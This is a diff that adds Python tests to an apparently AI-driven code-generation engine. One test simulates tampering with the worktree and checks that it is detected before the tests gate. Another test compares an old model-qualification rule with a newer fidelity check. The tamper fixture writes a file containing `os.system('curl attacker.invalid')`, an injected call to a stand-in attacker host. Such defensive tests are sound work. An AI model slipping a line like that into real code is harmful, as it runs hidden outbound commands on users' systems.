+    def gate_then_tamper(cfg, state, **kwargs):
+        real_gate(cfg, state, **kwargs)
+        (ws / ".kriya" / "worktree" / "calc.py").write_text("import os\nos.system('curl attacker.invalid')\n")
+        tampered["done"] = True
+
+    ran_on_tampered_tree = []
+    real_tests = PolymorphicValidator.run_tests.__wrapped__
+
+    def recording_tests(self, *args, **kwargs):
+        if tampered["done"]:
+            ran_on_tampered_tree.append(True)
+        return real_tests(self, *args, **kwargs)
+
+    from kriya.tools.validate import _verification_gate
+
+    monkeypatch.setattr(workflow_module, "_run_static_analysis_gate", gate_then_tamper)
+    monkeypatch.setattr(PolymorphicValidator, "run_tests", _verification_gate("tests")(recording_tests))
+    result = asyncio.run(engine.run_generation_workflow("Add sub to calc.py", str(ws)))
+
+    assert tampered["done"] is True
+    assert result["quality_gates_passed"] is False
+    assert result.get("failure_category") == "verification_tree_mutated"
+    assert ran_on_tampered_tree == []
+    with sqlite3.connect(trace_db_path(engine.kernel.config)) as db:
+        (outcomes,) = db.execute("SELECT gate_outcomes FROM runs ORDER BY timestamp DESC LIMIT 1").fetchone()
+    stops = [o for o in _json.loads(outcomes) if o["type"] == "verification_tree_mutated"]
+    assert stops and "detected before the tests gate" in stops[0]["output"]
+    assert (ws / "calc.py").read_text() == "def add(a, b):\n    return a + b\n"
+
+
+def _historical_v6_full_file_rule(content):
+    """The /6 full_file_raw_content rule (kept only for this regression): the
+    model had to INVENT a fenced docstring example - it failed faithful models."""
+    try:
+        tree = ast.parse(content)
+    except SyntaxError:
+        return False
+    defines = any(isinstance(node, ast.FunctionDef) and node.name == "slugify" for node in ast.walk(tree))
+    return defines and "```" in content
+
+
+def test_v7_measures_fidelity_where_v6_measured_invention():
+    """A model that returns any file it is given unchanged, and writes a
+    correct slug module without a fenced example when asked to invent one
+    (both pinned models, 0/8 in the protocol evaluation): the historical /6
+    rule fails it, the /7 fidelity case passes it."""
+    import asyncio
+
+    from kriya.core import model_qualification as mq
+    from kriya.core.completion import CompletionResult, CompletionStatus
+
+    invented_without_fence = "import re\n\n\ndef slugify(text: str) -> str:\n    return text.lower()\n"
+    assert _historical_v6_full_file_rule(invented_without_fence) is False
+
+    class FaithfulModel:
+        async def complete_result(self, system, prompt, **kwargs):
+            supplied = prompt.split("=== slug.py (return this exact file) ===\n", 1)[1].split("=== end of slug.py", 1)[0]
+            return CompletionResult(content=_slug_block(supplied), status=CompletionStatus.OK, finish_reason="stop")
+
+    result = asyncio.run(mq.case_full_file_raw_content(FaithfulModel(), "m", {"response_protocol": "structured"}))
+    assert result.status == mq.PASS, result.evidence
+    assert result.evidence["payload_exact"] is True and result.evidence["fence_preserved"] is True
